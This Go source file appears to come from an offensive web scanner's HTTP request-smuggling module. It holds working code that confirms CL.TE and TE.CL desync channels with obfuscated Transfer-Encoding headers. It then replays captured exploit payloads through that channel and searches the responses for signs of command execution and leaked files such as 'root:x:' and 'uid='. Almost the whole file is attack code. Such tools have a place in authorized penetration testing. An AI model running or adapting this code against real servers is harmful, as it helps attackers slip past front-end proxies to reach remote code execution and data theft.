package capture

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net"
	"sort"
	"strings"
	"time"
)

// 回放命中判定用的通用 RCE/敏感信息特征；只有直连响应里没有、走私响应里才出现的才算命中。
var replayMarkers = []string{
	"uid=", "www-data", "root:x:", "nt authority", "command executed",
	"jolokia", "ognl", "heapdump", "boot_id", "java.lang.runtime",
	"exception", "file:///",
}

// smuggledPerm is one TE header obfuscation permutation used to confirm the
// CL.TE / TE.CL desync channel.
type smuggledPerm struct {
	Name    string
	TEKey   string
	TEValue string
}

// 回放阶段只尝试少量 TE 混淆组合，控制耗时。
var smuggledPerms = []smuggledPerm{
	{"spacejoin", "Transfer Encoding:", "chunked"},
	{"default", "Transfer-Encoding:", "chunked"},
	{"underjoin", "Transfer_Encoding:", "chunked"},
	{"space1", "Transfer-Encoding: ", "chunked"},
	{"space2", "Transfer-Encoding:", "chunked"},
	{"nameprefix1", " Transfer-Encoding:", "chunked"},
}

// ReplayAll is the second pass: it only runs when the normal pass produced zero
// findings or zero successful exploits. Every payload captured from the probes
// is replayed once through a confirmed CL.TE / TE.CL smuggling channel. Smuggled
// responses are also fingerprinted so a newly exposed component can trigger its
// exploits again.
func (r *Recorder) ReplayAll(buckets map[string][]*Request, timeout time.Duration) []*Finding {
	keys := make([]string, 0, len(buckets))
	for k, v := range buckets {
		if len(v) > 0 {
			keys = append(keys, k)
		}
	}
	sort.Strings(keys)

	var out []*Finding
	for _, key := range keys {
		if f := r.replayThroughSmuggling(key, buckets[key], timeout); f != nil {
			out = append(out, f)
		}
	}
	return out
}

func (r *Recorder) replayThroughSmuggling(key string, reqs []*Request, timeout time.Duration) *Finding {
	if len(reqs) == 0 {
		return nil
	}
	scheme := reqs[0].Scheme
	if scheme == "" {
		scheme = "http"
	}
	host := reqs[0].HostHdr
	if host == "" {
		host = key
	}

	perm, variant, ok := detectDesync(scheme, key, host, timeout)
	if !ok {
		return nil
	}

	delivered := 0
	lastPath := ""
	seen := make(map[string]bool, len(reqs))
	for _, rec := range reqs {
		sig := rec.Method + " " + rec.URL + "\n" + string(rec.Body)
		if seen[sig] {
			continue
		}
		seen[sig] = true
		cb := randHex(4)
		smuggled := buildRawRequest(rec, host)
		payload := smugglingPayload(perm, variant, host, smuggled, cb)
		resp, responses := sendSmuggled(scheme, key, payload, timeout)
		if responses == 0 {
			continue
		}
		delivered++
		lastPath = rec.Method + " " + rec.Path
		r.ObserveRaw(key, rec.Path, resp)
		if m := successMarker(rec, resp); m != "" {
			return &Finding{
				Target:   fmt.Sprintf("%s://%s", scheme, key),
				Vuln:     fmt.Sprintf("HTTP Smuggling Payload Replay: %s %s", rec.Method, rec.Path),
				Severity: "CRITICAL",
				Detail: fmt.Sprintf("payload carried through %s (%s), marker %q found in smuggled response",
					variant, perm.Name, m),
				URL: fmt.Sprintf("%s://%s%s", scheme, key, rec.Path),
			}
		}
	}

	if delivered > 0 {
		return &Finding{
			Target:   fmt.Sprintf("%s://%s", scheme, key),
			Vuln:     "HTTP Smuggling Payload Replay (delivered)",
			Severity: "HIGH",
			Detail: fmt.Sprintf("%d payload(s) replayed through %s (%s), last=%s; direct requests produced no finding",
				delivered, variant, perm.Name, lastPath),
			URL: fmt.Sprintf("%s://%s", scheme, key),
		}
	}
	return nil
}

// detectDesync confirms a CL.TE / TE.CL channel with timing, trying a bounded
// number of TE obfuscation permutations.
func detectDesync(scheme, addr, host string, timeout time.Duration) (smuggledPerm, string, bool) {
	cb := randHex(4)
	baseline := fmt.Sprintf("GET /?cb=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", cb, host)
	base := rawTest(scheme, addr, baseline, timeout)
	if base.Code != 0 || base.Elapsed > 1500*time.Millisecond {
		return smuggledPerm{}, "", false
	}

	for _, p := range smuggledPerms {
		clte := fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n%s%s\r\n\r\n0\r\n\r\nZ",
			cb, host, p.TEKey, p.TEValue)
		if r := rawTest(scheme, addr, clte, timeout); r.Code == 1 && r.Elapsed >= timeout-300*time.Millisecond {
			return p, "CL.TE", true
		}

		tecl := fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 3\r\n%s%s\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
			cb, host, p.TEKey, p.TEValue)
		if r := rawTest(scheme, addr, tecl, timeout); r.Code == 1 && r.Elapsed >= timeout-300*time.Millisecond {
			return p, "TE.CL", true
		}
	}
	return smuggledPerm{}, "", false
}

// smugglingPayload wraps a raw request inside the desync body.
func smugglingPayload(p smuggledPerm, variant, host string, smuggled []byte, cb string) string {
	if variant == "TE.CL" {
		size := fmt.Sprintf("%x\r\n", len(smuggled))
		return fmt.Sprintf(
			"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n%s%s\r\nConnection: keep-alive\r\n\r\n%s%s\r\n0\r\n\r\n",
			cb, host, len(size), p.TEKey, p.TEValue, size, smuggled)
	}
	prefix := "0\r\n\r\n"
	return fmt.Sprintf(
		"POST /?cb=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n%s%s\r\nConnection: keep-alive\r\n\r\n%s%s",
		cb, host, len(prefix)+len(smuggled), p.TEKey, p.TEValue, prefix, smuggled)
}

// testResult: 0=normal response, 1=timeout (smuggling!), 2=early disconnect
type testResult struct {
	Code    int
	Resp    string
	Elapsed time.Duration
}

// rawTest sends one raw payload and returns the first read result.
func rawTest(scheme, addr, payload string, timeout time.Duration) testResult {
	conn, err := dialTarget(scheme, addr, 5*time.Second)
	if err != nil {
		return testResult{Code: -1}
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	start := time.Now()
	if _, err := conn.Write([]byte(payload)); err != nil {
		return testResult{Code: -1, Elapsed: time.Since(start)}
	}
	buf := make([]byte, 16384)
	n, err := conn.Read(buf)
	elapsed := time.Since(start)
	if isTimeoutErr(err) {
		return testResult{Code: 1, Elapsed: elapsed}
	}
	if n == 0 {
		return testResult{Code: 2, Elapsed: elapsed}
	}
	return testResult{Code: 0, Resp: string(buf[:n]), Elapsed: elapsed}
}

// sendSmuggled writes the desync payload and reads up to two responses (the
// carrier POST and the smuggled request).
func sendSmuggled(scheme, addr, payload string, timeout time.Duration) (string, int) {
	conn, err := dialTarget(scheme, addr, 5*time.Second)
	if err != nil {
		return "", 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write([]byte(payload)); err != nil {
		return "", 0
	}

	var sb strings.Builder
	for {
		buf := make([]byte, 8192)
		n, err := conn.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if strings.Count(sb.String(), "HTTP/1.") >= 2 {
			break
		}
		if err != nil {
			break
		}
	}
	return sb.String(), strings.Count(sb.String(), "HTTP/1.")
}

func dialTarget(scheme, addr string, timeout time.Duration) (net.Conn, error) {
	if scheme == "https" {
		d := &net.Dialer{Timeout: timeout}
		return tls.DialWithDialer(d, "tcp", addr, &tls.Config{InsecureSkipVerify: true})
	}
	return net.DialTimeout("tcp", addr, timeout)
}

func successMarker(rec *Request, resp string) string {
	direct := strings.ToLower(string(rec.RespBody))
	low := strings.ToLower(resp)
	for _, m := range replayMarkers {
		if strings.Contains(low, m) && !strings.Contains(direct, m) {
			return m
		}
	}
	return ""
}

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func isTimeoutErr(err error) bool {
	if err == nil {
		return false
	}
	if ne, ok := err.(net.Error); ok && ne.Timeout() {
		return true
	}
	return strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline")
}
